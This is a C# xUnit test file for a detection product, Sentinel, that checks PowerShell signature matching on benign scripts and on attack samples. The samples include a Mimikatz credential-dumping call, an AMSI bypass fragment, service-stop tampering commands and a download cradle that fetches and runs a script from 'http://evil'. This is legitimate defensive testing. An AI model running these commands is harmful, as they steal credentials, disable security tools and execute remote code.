using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// Tests for the PowerShell script-block signature matching used by
    /// ScriptExecutionMonitor. The matching helpers are pure/I-O-free
    /// (InternalsVisibleTo Sentinel.Tests) so we can assert the signature set
    /// without reading the Windows event log or constructing the full monitor.
    /// </summary>
    public class ScriptExecutionMonitorTests
    {
        //  Self-referential "Sentinel" false positive is gone 

        [Fact]
        public void BenignScript_ReferencingSentinelProgramData_DoesNotMatch()
        {
            // Previously matched the bare "Sentinel" substring and got its tree killed.
            var script = @"$log = ""$env:ProgramData\Sentinel\logs\run.log""; Write-Host ""Sentinel diagnostics complete""";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.Empty(matches);
            Assert.False(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        [Fact]
        public void BenignScript_WithBareWordSentinel_DoesNotMatch()
        {
            var script = @"# This is the Sentinel push helper. It references Sentinel a lot.";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.Empty(matches);
            Assert.False(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        //  Genuine Sentinel service-tamper still escalates 

        [Fact]
        public void SentinelServiceStop_StillMatchesAndIsCritical()
        {
            var script = @"Stop-Service Sentinel -Force";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        [Fact]
        public void ScStopSentinel_StillMatchesAndIsCritical()
        {
            var script = @"sc.exe stop Sentinel";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        //  Genuine attack-tool signatures were NOT weakened 

        [Fact]
        public void Mimikatz_StillMatchesAndIsCritical()
        {
            var script = @"Invoke-Mimikatz -Command '""sekurlsa::logonpasswords""'";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        [Fact]
        public void AmsiBypass_StillMatchesAndIsCritical()
        {
            var script = @"[Ref].Assembly.GetType('...').GetField('amsiInitFailed'); AmsiScanBuffer";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        [Fact]
        public void DownloadCradle_StillMatches()
        {
            var script = @"IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
        }
    }
}
